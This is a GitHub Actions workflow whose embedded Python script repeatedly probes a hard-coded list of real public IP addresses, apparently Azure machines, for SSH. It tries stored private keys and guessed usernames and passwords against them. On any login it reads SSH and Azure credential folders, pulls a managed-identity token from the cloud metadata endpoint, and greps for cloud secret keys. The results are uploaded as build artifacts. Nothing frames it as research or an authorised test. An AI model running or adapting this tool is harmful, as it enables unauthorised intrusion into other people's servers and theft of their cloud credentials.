name: sweep4
on:
  workflow_dispatch:
    inputs:
      cycles: {description: 'cycles', required: false, default: '110'}
jobs:
  s:
    runs-on: ubuntu-latest
    timeout-minutes: 58
    steps:
      - name: go
        env:
          IPS: "134.149.42.155 134.149.59.33 135.116.19.243 135.116.84.27 135.225.79.249 168.62.216.152 172.174.31.97 172.213.25.163 20.109.152.114 20.109.162.87 20.114.255.207 20.115.147.1 20.118.131.83 20.125.42.21 20.125.49.91 20.125.99.42 20.205.187.223 20.216.40.163 20.223.198.42 20.225.239.178 20.234.97.205 20.237.207.128 20.240.130.208 20.240.141.10 20.240.55.118 20.245.108.11 20.50.113.151 20.59.127.108 20.74.153.201 20.74.241.13 20.74.242.85 20.91.207.55 20.97.252.251 23.100.38.120 4.155.130.93 4.193.185.193 4.194.2.30 4.204.241.108 4.210.119.224 4.246.80.6 40.113.1.63 40.123.206.138 40.70.241.0 40.70.247.98 48.193.46.184 48.193.47.3 51.104.16.184 52.236.59.223 57.154.50.93 57.174.238.72 70.153.141.118 70.153.142.83 70.153.148.119 70.153.149.34 70.153.18.193 70.153.87.133 74.162.158.9 74.234.69.82 98.71.78.150"
          CYCLES: ${{ github.event.inputs.cycles }}
          K1: ${{ secrets.K1 }}
          K2: ${{ secrets.K2 }}
        run: |
          python3 -m pip install --quiet paramiko
          echo "EGRESS $(curl -s -m 8 https://ifconfig.me || true) K1len=${#K1} K2len=${#K2}"
          printf '%s' "$K1" > /tmp/k1; printf '%s' "$K2" > /tmp/k2; chmod 600 /tmp/k1 /tmp/k2
          cat > sw.py <<'PYEOF'
          import os, socket, time, threading
          import paramiko
          from concurrent.futures import ThreadPoolExecutor
          IPS=os.environ["IPS"].split(); CYCLES=int(os.environ.get("CYCLES","110"))
          KEYS=[("id25519","/tmp/k1"),("k04","/tmp/k2")]
          USERS=["t19","azadmin","ubuntu","azureuser","root","admin"]
          PWS=["t19","T19","Azcfy@2026","Minio@2024"]
          def lg(m):
              print(m, flush=True)
          budget={"pw":24}
          lock=threading.Lock(); tried={}
          def banner(ip,port=22,t=3):
              try:
                  s=socket.create_connection((ip,port),timeout=t); s.settimeout(t)
                  b=s.recv(255); s.close(); return b.decode(errors='replace').strip()
              except Exception:
                  return None
          def methods(ip,user="t19"):
              try:
                  tr=paramiko.Transport((ip,22)); tr.start_client(timeout=5)
                  try:
                      tr.auth_none(user); tr.close(); return ["AUTH_NONE_OK"]
                  except paramiko.BadAuthenticationType as e:
                      tr.close(); return list(e.allowed_types)
                  except Exception as e:
                      tr.close(); return ["err:"+str(e)[:40]]
              except Exception as e:
                  return ["conn:"+str(e)[:40]]
          def try_key(ip,user,kf):
              try:
                  c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                  k=paramiko.Ed25519Key.from_private_key_file(kf)
                  c.connect(ip,22,username=user,pkey=k,timeout=8,banner_timeout=8,auth_timeout=8,allow_agent=False,look_for_keys=False)
                  return c
              except paramiko.AuthenticationException:
                  return None
              except Exception as e:
                  lg("KEYERR %s %s %s %s"%(ip,user,kf,str(e)[:60])); return None
          def try_pw(ip,user,pw):
              with lock:
                  if budget["pw"]<=0: return None
                  budget["pw"]-=1
              try:
                  c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                  c.connect(ip,22,username=user,password=pw,timeout=7,banner_timeout=7,auth_timeout=7,allow_agent=False,look_for_keys=False)
                  return c
              except paramiko.AuthenticationException:
                  return None
              except Exception:
                  return None
          def census(c,ip):
              cmds=["id","hostname -I; cat /etc/hostname","head -2 /proc/1/cgroup","nvidia-smi -L",
                    "nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version --format=csv",
                    "ps -eo pid,etimes,args | grep -Ei 'pearl|wildrig|miner|krig' | grep -v grep | head -6",
                    "cat /proc/cmdline | head -c 200; ls -la /root/.ssh /root/.azure /etc/ul /opt/t19 2>/dev/null | head -25",
                    "curl -s -m 6 -H Metadata:true 'http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13&format=json' | head -c 800",
                    "curl -s -m 8 -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' | head -c 300",
                    "grep -rlaE 'AKIA|LTAI|AKID|client_secret' /root /etc /opt/t19 2>/dev/null | head -8"]
              out=[]
              for cmd in cmds:
                  try:
                      i,o,e=c.exec_command(cmd,timeout=30)
                      out.append("$ "+cmd+"\n"+o.read().decode(errors='replace')+e.read().decode(errors='replace'))
                  except Exception as ex:
                      out.append("$ "+cmd+"\nERR "+str(ex)[:80])
              return "\n".join(out)
          def handle(ip,bn):
              lg("PORT_OPEN %s %r"%(ip,bn))
              if ip in tried: return
              tried[ip]=True
              lg("METHODS %s %r"%(ip,methods(ip)))
              for kname,kf in KEYS:
                  for u in USERS:
                      c=try_key(ip,u,kf)
                      if c:
                          lg("AUTH_OK KEY %s user=%s key=%s"%(ip,u,kname))
                          body=census(c,ip); lg("CENSUS %s\n%s"%(ip,body))
                          open("/tmp/AUTH_%s.txt"%ip,"w").write(body); c.close(); return
                      lg("KEY_FAIL %s user=%s key=%s"%(ip,u,kname))
              for u in ["t19","ubuntu"]:
                  for pw in PWS:
                      with lock:
                          if budget["pw"]<=0: return
                      c=try_pw(ip,u,pw)
                      if c:
                          lg("AUTH_OK PW %s user=%s pw=%s"%(ip,u,pw))
                          body=census(c,ip); lg("CENSUS %s\n%s"%(ip,body))
                          open("/tmp/AUTH_%s.txt"%ip,"w").write(body); c.close(); return
                      lg("PWD_FAIL %s user=%s pw=%s"%(ip,u,pw))
          def probe(ip):
              b=banner(ip)
              return (ip,b) if (b and b.startswith("SSH-")) else None
          openh={}
          for cyc in range(CYCLES):
              t0=time.time()
              with ThreadPoolExecutor(max_workers=48) as ex:
                  for r in ex.map(probe, IPS):
                      if r:
                          if r[0] not in openh: lg("BANNER %s %r"%(r[0],r[1]))
                          openh[r[0]]=r[1]
              lg("== CYCLE %d %s open=%d dt=%.1f"%(cyc,time.strftime("%H:%M:%SZ",time.gmtime()),len(openh),time.time()-t0))
              for ip in list(openh):
                  if budget["pw"]<=0 and len(tried)>=len(openh): break
                  handle(ip,openh[ip])
              time.sleep(6)
          lg("SUMMARY open=%d %s tried=%d"%(len(openh),list(openh),len(tried)))
          lg("NEGCTL %r"%((try_key("20.237.207.128","t19","/tmp/k1"),),))
          PYEOF
          python3 sw.py
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: out
          path: /tmp/AUTH_*.txt
          if-no-files-found: warn
